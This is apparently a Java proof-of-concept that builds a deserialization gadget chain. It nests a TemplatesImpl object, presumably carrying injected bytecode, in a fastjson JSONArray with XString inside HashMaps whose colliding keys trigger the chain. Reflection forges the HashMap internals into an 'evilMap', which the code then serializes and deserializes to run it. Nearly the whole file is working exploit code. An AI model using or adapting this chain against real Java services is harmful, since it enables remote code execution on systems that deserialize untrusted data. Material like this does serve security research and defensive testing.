package com.jdk;

import com.alibaba.fastjson.JSONArray;
import com.example.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;

public class HashMapChain {
    public static void main(String[] args) throws Exception {
        TemplatesImpl tpl = Utils.getTemplatesImpl();
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(tpl);

        XString xString = new XString("xxx");
        HashMap h1 = new HashMap();
        HashMap h2 = new HashMap();
        h1.put("zZ", jsonArray);
        h1.put("yy", xString);
        h2.put("zZ", xString);
        h2.put("yy", jsonArray);

//        HashMap<Object,Object> hashMap = new HashMap<>();
//        hashMap.put(h1,h1);
//        hashMap.put(h2,h2);
//
//        Utils.SetValue(h2,"target",new XString("xxx"));
        HashMap evilMap = makeMap(h1, h2);

        String barr = Utils.Serialize(evilMap);
        System.out.println(barr);
        Utils.UnSerialize(barr);
    }

    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        Utils.SetValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Utils.SetValue(s, "table", tbl);
        return s;
    }
}